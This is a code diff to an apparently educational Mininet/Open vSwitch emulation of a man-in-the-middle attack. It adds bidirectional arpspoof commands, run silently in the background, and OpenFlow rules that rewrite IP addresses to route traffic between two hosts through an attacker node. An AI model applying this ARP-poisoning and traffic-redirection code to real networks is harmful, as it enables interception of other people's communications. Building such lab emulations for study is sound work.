@@ -199,29 +199,24 @@ class MiMOVSSwitch( OVSSwitch ):
     def add_mim( self, source, target, mim ):
         # BEWARE THIS IS IPV4
 
-        # get ip, mac
-
-        # arp request is sent to broadcast (flood rule)
-        # arp reply is sent to who requested
-
-        # sh ovs-ofctl add-flow s1 dl_type=0x806,nw_proto=1,dl_src=00:00:00:00:00:03,actions=drop
-
         # sh ovs-ofctl add-flow s1 dl_src=00:00:00:00:00:01,dl_dst=00:00:00:00:00:03,actions=mod_nw_dst:10.0.0.3,output:3
         # sh ovs-ofctl add-flow s1 dl_src=00:00:00:00:00:03,dl_dst=00:00:00:00:00:01,actions=mod_nw_src:10.0.0.2,output:1
         # sh ovs-ofctl add-flow s1 dl_type=0x806,nw_proto=1,actions=flood
-        # arpspoof -i h3-eth0 -c own -t 10.0.0.1 10.0.0.2
 
-        # drop arp replies from mim (3)
-        # print(self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x806,nw_proto=1,nw_src=10.0.0.3,actions=drop"))
-        
+        # PART 1 fake communication with source
         # mac 10.0.0.2 is already linked to (3) by mim arpspoof
         # malicious node changes the ip
         # source -> mim, mim
         self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_dst:%s,output:3" % (source.MAC(), mim.MAC(), mim.IP()))
         # mim -> target, source
         self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_src:%s,output:1" % (mim.MAC(), source.MAC(), target.IP()))
-        # drop the arp relys coming from mim
-        # self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x806,nw_proto=1,dl_src=%s,actions=drop" % (mim.MAC()))
+        
+        # PART 2 fake communication with target
+        # source -> mim, mim
+        self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_dst:%s,output:3" % (target.MAC(), mim.MAC(), mim.IP()))
+        # mim -> target, source
+        self.cmd("ovs-ofctl", "add-flow", "s1", "dl_src=%s,dl_dst=%s,actions=mod_nw_src:%s,output:2" % (mim.MAC(), target.MAC(), source.IP()))
+        
         # flood the arp relys to all nodes who requested them
         self.cmd("ovs-ofctl", "add-flow", "s1", "dl_type=0x806,nw_proto=1,actions=flood")
         print(self.cmd("ovs-ofctl", "dump-flows", "s1"))
@@ -231,7 +226,8 @@ class MiMNode( Node ):
         Node.__init__(  self, name, inNamespace=True, **params  )
 
     def start_arpspoof( self, source, target ):
-        # "2>/dev/null 1>/dev/null &"
-        self.cmd("arpspoof", "-i mim-eth0", "-c own", "-t %s" % source.IP(), "%s" % target.IP(), " &")
-        # on mim
-        # arpspoof -i h3-eth0 -c own -t 10.0.0.1 10.0.0.2 # send arp reply
+        # fake MAC in arp table of source
+        self.cmd("arpspoof", "-i mim-eth0", "-t %s" % source.IP(), "%s" % target.IP(), " 2>/dev/null 1>/dev/null &")
+        # fake MAC in arp table of target
+        self.cmd("arpspoof", "-i mim-eth0", "-t %s" % target.IP(), "%s" % source.IP(), " 2>/dev/null 1>/dev/null &")
+        # arpspoof -i h3-eth0 -c own -t 10.0.0.1 10.0.0.2 2>/dev/null 1>/dev/null & # send arp reply
